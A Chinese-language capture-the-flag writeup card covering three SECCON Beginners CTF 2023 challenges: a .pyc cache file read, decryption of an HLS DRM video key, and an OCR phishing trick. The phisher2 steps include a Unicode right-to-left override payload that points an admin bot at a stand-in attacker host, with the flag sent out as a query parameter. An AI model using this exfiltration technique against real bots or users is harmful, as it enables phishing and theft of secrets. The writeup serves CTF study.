---
title: "SECCON Beginners CTF (ctf4b) 作問者 writeup"
category: pwn
tags: ["SECCON Beginners CTF", "pwn", "pycache-pyc", "hls-drm", "was-stream", "video-crypt"]
signals: ["SECCON Beginners CTF 2023", "pycache-pyc", "hls-drm", "was-stream", "video-crypt", "custom-loader", "aes-128", "bidi-rtl", "uca-phishing", "pwn_unknown", "SECCON", "Beginners", "CTF", "shaXXX"]
difficulty: medium
source: "https://www.ctfiot.com/117903.html"
tools: ["Python"]
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# SECCON Beginners CTF (ctf4b) 作問者 writeup

> 赛事：SECCON Beginners CTF 2023 | 方向：pwn | 难度：medium | 工具：Python

## 一句话总结

SECCON Beginners CTF 作問者 3 题：shaXXX (Python pyc 缓存读) + drmsaw (HLS 自定义 CustomLoader 替换 AES-128 KEY) + phisher2 (Unicode U+202E RTL 字符 OCR 钓鱼)。

## 攻击链

1. 题目 1 shaXXX (Python): hashlib.sha256/384/512 + flags/sha256.txt 文件读
2. 绕过 check1: startswith(program_root) 用 normpath 切 ../
3. 绕过 check2: os.path.basename != ''flag.py'' 但可读 __pycache__/flag.cpython-311.pyc
4. 输入: __pycache__/flag.cpython-311.pyc → 读 .pyc 文件 → 找到 ctf4b{c4ch3_15_0ur_fr13nd!}
5. 题目 2 drmsaw: HLS.js DRM 视频 + 自定义 CustomLoader
6. keyUrl="/enc.key" 替换 #EXT-X-KEY:METHOD 为 AES-128
7. key = [99, 9, 61, 110, 94, 114, 119, 194, 42, 163, 63, 8, 97, 114, 131, 41]
8. IV=0x00...00 + ffmpeg -allowed-extensions ALL 合并 .ts
9. 上传 /flag POST video/mp4 拿 ctf4b{d1ff1cul7_70_3n5ur3_53cur17y_1n_cl13n7-51d3-4pp5}
10. 题目 3 phisher2: OCR 钓鱼 + admin bot 访问
11. 输入 text 写 /var/www/uploads/{fileId}.html
12. share2admin: openWebPage() + OCR + 找 URL
13. find_url_in_text: regex r"https?://[\w/:&\?\.=]+
14. 输入 URL 必须 startswith(APP_URL) 才会被打开
15. 输入 URL 还需 ?flag=FLAG 触发 flag 外带
16. 利用 Unicode U+202E (RLO) RTL 覆盖字符反转 URL
17. payload: [U+202E]https://attacker.m.pipedream.net/{ENDPOINT[::-1]}
18. OCR 时 URL 显示反向但 admin 实际打开 attacker
19. flag 经 requests.get(f"{input_url}?flag={FLAG}") 外带

## 关键 payload

```
key=[99, 9, 61, 110, 94, 114, 119, 194, 42, 163, 63, 8, 97, 114, 131, 41] + IV=0x00*16
```

## 经验教训

__pycache__ 缓存是 Python 源码常见攻击面 (绕过 normpath 检查)；HLS CustomLoader 替换 #EXT-X-KEY 是 DRM 视频破解关键；U+202E 是 Unicode RTL 字符绕过 OCR 钓鱼经典手法。

## 标签

pycache-pyc、hls-drm、was-stream、video-crypt、custom-loader、aes-128、bidi-rtl、uca-phishing、ocr-screen、py-deserialize

## 参考来源

- https://www.ctfiot.com/117903.html
- 原文件：SECCON_Beginners_CTF_(ctf4b)_作問者writeup.full.md
